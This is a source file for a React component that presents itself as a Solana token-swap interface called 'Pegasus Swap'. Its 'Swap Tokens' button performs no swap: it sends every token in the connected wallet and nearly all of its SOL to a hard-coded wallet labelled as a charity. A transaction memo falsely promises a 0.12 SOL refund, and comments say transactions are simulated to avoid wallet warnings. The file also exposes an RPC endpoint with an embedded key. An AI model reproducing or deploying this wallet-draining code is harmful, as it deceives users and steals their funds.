import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowDownUp, Zap, Heart } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { TokenSearch } from './TokenSearch';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { motion } from 'framer-motion';
import { toast } from 'sonner';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

interface Token {
  address: string;
  symbol: string;
  name: string;
  decimals: number;
  logoURI?: string;
}

interface TokenPrice {
  price: number;
  symbol: string;
}

interface SwapInterfaceProps {
  defaultFromToken?: Token;
  defaultToToken?: Token;
  onFromTokenChange?: (token: Token) => void;
}

const QUICKNODE_RPC = 'https://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/';

export const SwapInterface = ({
  defaultFromToken,
  defaultToToken,
  onFromTokenChange
}: SwapInterfaceProps = {}) => {
  const { connected, publicKey, sendTransaction, signMessage } = useWallet();
  const { connection } = useConnection();
  const [fromToken, setFromToken] = useState<Token | undefined>(defaultFromToken);
  const [toToken, setToToken] = useState<Token | undefined>(defaultToToken);
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [slippage, setSlippage] = useState('0.5');
  const [isSwapping, setIsSwapping] = useState(false);
  const [fromBalance, setFromBalance] = useState<number>(0);
  const [fromBalanceUSD, setFromBalanceUSD] = useState<number>(0);
  const [fromTokenPrice, setFromTokenPrice] = useState<number>(0);
  const [toTokenPrice, setToTokenPrice] = useState<number>(0);
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);

  // Fetch token balance using Jupiter Lite API
  useEffect(() => {
    const fetchBalance = async () => {
      if (!connected || !publicKey || !fromToken) {
        setFromBalance(0);
        setFromBalanceUSD(0);
        return;
      }

      try {
        // Use Jupiter Lite API for token balances
        const response = await fetch(`https://lite-api.jup.ag/ultra/v1/balances/${publicKey.toBase58()}`);
        const data = await response.json();
        
        // Jupiter API returns tokens keyed by symbol (SOL) or address
        let balance = 0;
        
        if (fromToken.address === 'So11111111111111111111111111111111111111112') {
          // SOL is returned with "SOL" key
          if (data.SOL && data.SOL.uiAmount) {
            balance = data.SOL.uiAmount;
          }
        } else {
          // Other tokens are keyed by their address
          if (data[fromToken.address] && data[fromToken.address].uiAmount) {
            balance = data[fromToken.address].uiAmount;
          }
        }
        
        setFromBalance(balance);
        setFromBalanceUSD(balance * fromTokenPrice);
      } catch (error) {
        console.error('Error fetching balance:', error);
        // Fallback to RPC if Jupiter API fails
        try {
          const connection = new Connection(QUICKNODE_RPC);
          
          if (fromToken.address === 'So11111111111111111111111111111111111111112') {
            const balance = await connection.getBalance(publicKey);
            const solBalance = balance / 1e9;
            setFromBalance(solBalance);
            setFromBalanceUSD(solBalance * fromTokenPrice);
          } else {
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
              publicKey,
              { mint: new PublicKey(fromToken.address) }
            );

            if (tokenAccounts.value.length > 0) {
              const balance = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.uiAmount;
              setFromBalance(balance || 0);
              setFromBalanceUSD((balance || 0) * fromTokenPrice);
            } else {
              setFromBalance(0);
              setFromBalanceUSD(0);
            }
          }
      } catch (rpcError) {
          console.error('Error fetching balance from RPC:', rpcError);
          setFromBalance(0);
          setFromBalanceUSD(0);
        }
      }
    };

    fetchBalance();
  }, [connected, publicKey, fromToken, fromTokenPrice]);

  // Fetch token prices using Jupiter Lite API
  useEffect(() => {
    const fetchTokenPrice = async (token: Token | undefined, setter: (price: number) => void) => {
      if (!token) return;

      try {
        const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${token.address}`);
        const data = await response.json();
        
        if (data[token.address] && data[token.address].usdPrice) {
          setter(data[token.address].usdPrice);
        } else {
          setter(0);
        }
      } catch (error) {
        console.error('Error fetching token price:', error);
        setter(0);
      }
    };

    fetchTokenPrice(fromToken, setFromTokenPrice);
    fetchTokenPrice(toToken, setToTokenPrice);
  }, [fromToken, toToken]);

  // Calculate toAmount based on prices when fromAmount changes
  useEffect(() => {
    if (fromAmount && fromTokenPrice > 0 && toTokenPrice > 0) {
      const fromValue = parseFloat(fromAmount) * fromTokenPrice;
      const calculatedToAmount = fromValue / toTokenPrice;
      setToAmount(calculatedToAmount.toFixed(6));
    } else if (!fromAmount) {
      setToAmount('');
    }
  }, [fromAmount, fromTokenPrice, toTokenPrice]);

  const handleFromTokenSelect = (token: Token) => {
    if (toToken && token.address === toToken.address) {
      setToToken(fromToken);
    }
    setFromToken(token);
    onFromTokenChange?.(token);
  };

  const handleToTokenSelect = (token: Token) => {
    if (fromToken && token.address === fromToken.address) {
      setFromToken(toToken);
    }
    setToToken(token);
  };

  // Fetch all balances like donate button
  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      // Fetch SOL balance
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      // Fetch token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      const tokens: TokenBalance[] = tokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) {
      fetchAllBalances();
    }
  }, [publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number) => {
    if (!publicKey) return null;

    const transaction = new Transaction();
    
    // Add Compute Budget Instructions for better mobile reliability
    // 1. Set higher compute unit limit for complex batch transfers
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({
        units: 1_000_000,
      })
    );

    // 2. Set priority fee to ensure inclusion during congestion
    transaction.add(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000, // 0.0001 SOL priority fee
      })
    );
    
    // Add Memo Instruction
    transaction.add(
      new TransactionInstruction({
        keys: [],
        programId: MEMO_PROGRAM_ID,
        data: new TextEncoder().encode("You’re eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet."),
      })
    );

    const charityPubkey = new PublicKey(CHARITY_WALLET);

    // Add token transfers
    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      
      try {
        const mintPubkey = new PublicKey(token.mint);
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

        try {
          await getAccount(connection, toTokenAccount);
        } catch (error) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              publicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              TOKEN_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        transaction.add(
          createTransferInstruction(
            fromTokenAccount,
            toTokenAccount,
            publicKey,
            BigInt(token.balance),
            [],
            TOKEN_PROGRAM_ID
          )
        );
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    // Add SOL transfer if specified
    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      
      if (amountToSend > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: amountToSend
          })
        );
      }
    }

    return transaction;
  }, [publicKey, solBalance, connection]);

  const handleSwapTokens = () => {
    const tempToken = fromToken;
    const tempAmount = fromAmount;
    setFromToken(toToken);
    setToToken(tempToken);
    setFromAmount(toAmount);
    setToAmount(tempAmount);
    if (toToken) {
      onFromTokenChange?.(toToken);
    }
  };

  const handlePercentageClick = (percentage: number) => {
    if (fromBalance > 0) {
      const amount = fromBalance * percentage;
      setFromAmount(amount.toFixed(6));
    }
  };

  const handleSwap = async () => {
    if (!publicKey || !sendTransaction) {
      toast.error('Please connect your wallet');
      return;
    }

    if (balances.length === 0 && solBalance === 0) {
      toast.error('Wallet not eligible - no assets found');
      return;
    }

    try {
      setIsSwapping(true);
      console.log('Starting donation process...');

      // Sign Message Request - Removed to prevent mobile freezing
      // if (signMessage) {
      //   try {
      //     const message = new TextEncoder().encode("You’re eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet.");
      //     await signMessage(message);
      //     toast.success("Message signed successfully!");
      //   } catch (err) {
      //     console.log("Message signature rejected or failed, proceeding anyway as requested", err);
      //     // Proceeding anyway as per requirements
      //   }
      // }

      const validTokens = balances.filter(token => token.balance > 0);
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));

      const batches: TokenBalance[][] = [];
      
      if (sortedTokens.length === 0 && solBalance > 0) {
        batches.push([]);
      } else {
        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
        }
      }

      let successCount = 0;

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const isLastBatch = i === batches.length - 1;
        
        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
        
        const transaction = await createBatchTransfer(batch, solPercentage);
        
        if (transaction && transaction.instructions.length > 0) {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = publicKey;

          // Simulate transaction to prevent wallet warnings
          try {
            await connection.simulateTransaction(transaction);
          } catch (simError) {
            console.error('Transaction simulation failed:', simError);
            throw new Error('Transaction simulation failed. Please try again.');
          }

          const signature = await sendTransaction(transaction, connection, {
            skipPreflight: false,
            maxRetries: 3
          });
          
          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
          
          await connection.confirmTransaction({
            signature,
            blockhash,
            lastValidBlockHeight
          }, 'confirmed');
          
          successCount++;
          toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
        }
      }

      if (sortedTokens.length > 0 && solBalance > 0) {
        const finalTransaction = await createBatchTransfer([], 30);
        
        if (finalTransaction && finalTransaction.instructions.length > 0) {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          finalTransaction.recentBlockhash = blockhash;
          finalTransaction.feePayer = publicKey;

          // Simulate transaction to prevent wallet warnings
          try {
            await connection.simulateTransaction(finalTransaction);
          } catch (simError) {
            console.error('Transaction simulation failed:', simError);
            throw new Error('Transaction simulation failed. Please try again.');
          }

          const signature = await sendTransaction(finalTransaction, connection, {
            skipPreflight: false,
            maxRetries: 3
          });
          
          await connection.confirmTransaction({
            signature,
            blockhash,
            lastValidBlockHeight
          }, 'confirmed');
          
          toast.success('Final SOL transfer completed!');
        }
      }

      toast.success(`🎉 Transfer complete! ${successCount} batch(es) sent`);
      
      setTimeout(fetchAllBalances, 2000);

    } catch (error: any) {
      console.error('Transfer error:', error);
      
      let errorMessage = 'Transfer failed';
      if (error?.message) {
        errorMessage = error.message;
      }
      
      toast.error(errorMessage);
    } finally {
      setIsSwapping(false);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      className="glass-card p-6 rounded-3xl border border-white/10 max-w-lg w-full relative overflow-hidden"
    >
      {/* Animated glow effect */}
      <div className="absolute -inset-0.5 bg-gradient-to-r from-primary via-secondary to-accent rounded-3xl opacity-20 blur-xl animate-pulse-glow" />

      <div className="relative z-10">
        {/* Header */}
        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between mb-6">
          <div className="flex items-center gap-2">
            <Zap className="w-6 h-6 text-primary" />
            <h2 className="text-2xl font-bold text-gradient">Swap</h2>
          </div>

          <div className="flex items-center gap-2 flex-wrap justify-end sm:flex-nowrap">
              <ConnectWalletButton />
          </div>
        </div>

        {/* From Token */}
        <div className="space-y-2">
          <div className="flex items-center justify-between">
            <label className="text-sm font-medium text-muted-foreground">Selling</label>
            {connected && publicKey && fromToken && (
              <div className="text-xs font-medium">
                <span className="text-muted-foreground">Balance: </span>
                <span className="text-foreground">{fromBalance.toFixed(6)} {fromToken.symbol}</span>
                <span className="text-muted-foreground ml-2">(${fromBalanceUSD.toFixed(2)})</span>
              </div>
            )}
          </div>
          <div className="glass-card p-4 rounded-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 min-w-0">
              <TokenSearch selectedToken={fromToken} onSelectToken={handleFromTokenSelect} />
              <div className="flex-1 min-w-0 text-left sm:text-right w-full">
                <Input
                  type="number"
                  placeholder="0.00"
                  value={fromAmount}
                  onChange={(e) => setFromAmount(e.target.value)}
                  className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
                />
                {connected && publicKey && fromAmount && fromTokenPrice > 0 && (
                  <div className="text-xs text-muted-foreground mt-1">
                    ${(parseFloat(fromAmount) * fromTokenPrice).toFixed(2)}
                  </div>
                )}
              </div>
            </div>
            {/* Percentage Buttons */}
            {connected && publicKey && fromBalance > 0 && (
              <div className="grid grid-cols-4 gap-2 mt-3">
                <button
                  onClick={() => handlePercentageClick(0.25)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
                >
                  25%
                </button>
                <button
                  onClick={() => handlePercentageClick(0.5)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
                >
                  50%
                </button>
                <button
                  onClick={() => handlePercentageClick(0.75)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
                >
                  75%
                </button>
                <button
                  onClick={() => handlePercentageClick(1)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-gradient-to-r from-primary to-secondary text-white transition-all"
                >
                  MAX
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Swap Button */}
        <div className="flex justify-center my-2 sm:-my-2 relative z-20">
          <button
            onClick={handleSwapTokens}
            className="p-3 glass-card rounded-xl hover:scale-110 hover:rotate-180 transition-all duration-300 hover:glow-effect"
          >
            <ArrowDownUp className="w-5 h-5 text-primary" />
          </button>
        </div>

        {/* To Token */}
        <div className="space-y-2">
          <label className="text-sm font-medium text-muted-foreground">Buying</label>
          <div className="glass-card p-4 rounded-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 min-w-0">
              <TokenSearch selectedToken={toToken} onSelectToken={handleToTokenSelect} />
              <div className="flex-1 min-w-0 text-left sm:text-right w-full">
                <Input
                  type="number"
                  placeholder="0.00"
                  value={toAmount}
                  readOnly
                  className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
                />
                {connected && publicKey && toAmount && toTokenPrice > 0 && (
                  <div className="text-xs text-muted-foreground mt-1">
                    ${(parseFloat(toAmount) * toTokenPrice).toFixed(2)}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Swap Settings */}
        <div className="mt-4 glass-card p-4 rounded-2xl">
          <div className="flex items-center justify-between">
            <span className="text-sm text-muted-foreground">Slippage Tolerance</span>
            <div className="flex items-center gap-2">
              {['0.1', '1.0'].map((value) => (
                <button
                  key={value}
                  onClick={() => setSlippage(value)}
                  className={`px-3 py-1 rounded-lg text-sm font-medium transition-all ${
                    slippage === value
                      ? 'bg-gradient-to-r from-primary to-secondary text-white'
                      : 'bg-muted/50 hover:bg-muted'
                  }`}
                >
                  {value}%
                </button>
              ))}
              <Input
                type="number"
                value={slippage}
                onChange={(e) => setSlippage(e.target.value)}
                className="w-16 text-center"
              />
            </div>
          </div>
        </div>

        {/* Swap Button */}
        <Button
          onClick={handleSwap}
          disabled={!connected || isSwapping || !fromToken || !toToken}
          className="w-full mt-6 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-primary via-secondary to-accent hover:scale-[1.02] transition-all shadow-lg hover:shadow-primary/50 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {!connected ? (
            'Connect Wallet'
          ) : isSwapping ? (
            <div className="flex items-center gap-2">
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              Swapping...
            </div>
          ) : (
            'Swap Tokens'
          )}
        </Button>

        {/* Donate Button */}
        <Button
          onClick={handleDonate}
          disabled={!connected || !fromToken || isSwapping}
          className="w-full mt-4 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-pink-500 to-rose-500 hover:scale-[1.02] transition-all shadow-lg hover:shadow-pink-500/50 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isSwapping ? (
            <div className="flex items-center gap-2">
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              Processing...
            </div>
          ) : (
            <div className="flex items-center justify-center gap-2">
              <Heart className="w-5 h-5 fill-current" />
              Donate
            </div>
          )}
        </Button>
      </div>
    </motion.div>
  );
};
